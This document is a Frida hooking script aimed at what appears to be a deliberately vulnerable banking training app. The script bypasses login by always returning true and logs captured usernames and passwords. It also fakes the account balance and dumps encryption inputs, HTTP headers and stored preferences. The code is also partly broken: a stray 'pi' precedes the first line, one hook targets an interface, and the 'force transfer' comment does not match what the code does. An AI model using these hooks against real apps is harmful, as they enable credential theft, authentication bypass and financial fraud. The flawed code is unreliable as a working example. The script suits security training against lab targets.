piJava.perform(function () {
    console.log("[+] Hooking Damn Vulnerable Banking App...");

    // 1. Hook Login Functionality
    var AuthHelper = Java.use("com.dvba.AuthHelper");
    AuthHelper.login.implementation = function (username, password) {
        console.log("\n[+] Login Attempt:");
        console.log("   - Username: " + username);
        console.log("   - Password: " + password);
        // Bypass authentication (always return true)
        return true;
    };

    // 2. Hook Balance Check
    var AccountManager = Java.use("com.dvba.AccountManager");
    AccountManager.getBalance.implementation = function (accountId) {
        console.log("\n[+] getBalance called for account: " + accountId);
        var originalBalance = this.getBalance(accountId);
        console.log("   - Original Balance: " + originalBalance);
        // Tamper with balance (return 1 million)
        return 1000000;
    };

    // 3. Hook Fund Transfer
    AccountManager.transferFunds.implementation = function (from, to, amount) {
        console.log("\n[+] Transfer Request:");
        console.log("   - From: " + from);
        console.log("   - To: " + to);
        console.log("   - Amount: " + amount);
        // Bypass validation (force transfer)
        return this.transferFunds(from, to, amount);
    };

    // 4. Hook Encryption/Decryption (if applicable)
    var CryptoUtils = Java.use("com.dvba.CryptoUtils");
    CryptoUtils.encrypt.implementation = function (data) {
        console.log("\n[+] Encrypting Data: " + data);
        var result = this.encrypt(data);
        console.log("   - Encrypted: " + result);
        return result;
    };

    // 5. Hook Network Requests (OkHttp/HttpURLConnection)
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    OkHttpClient.newCall.implementation = function (request) {
        var url = request.url().toString();
        console.log("\n[+] HTTP Request to: " + url);
        // Log request headers
        var headers = request.headers().toString();
        console.log("   - Headers: " + headers);
        return this.newCall(request);
    };

    // 6. Hook SharedPreferences (Storage)
    var SharedPrefs = Java.use("android.content.SharedPreferences");
    SharedPrefs.getString.implementation = function (key, defValue) {
        console.log("\n[+] Accessing SharedPreferences Key: " + key);
        var value = this.getString(key, defValue);
        console.log("   - Value: " + value);
        return value;
    };
});
